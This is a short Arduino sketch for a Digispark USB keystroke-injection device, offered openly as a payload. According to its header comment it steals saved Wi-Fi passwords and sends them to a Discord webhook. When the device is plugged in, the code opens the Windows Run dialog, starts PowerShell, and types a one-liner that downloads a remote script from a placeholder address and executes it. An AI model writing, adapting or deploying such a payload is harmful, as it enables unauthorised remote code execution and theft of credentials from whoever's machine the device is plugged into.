
/*
  EtherEye payload will grab saved Wifi password and will send them to your Discord Webhook.
*/
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Start Windows Run
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell"); //Jumping to temporary dir
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("iex ((New-Object System.Net.WebClient).DownloadString('PATH-TO-YOUR-PS1-SCRIPT-HERE'))");
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}


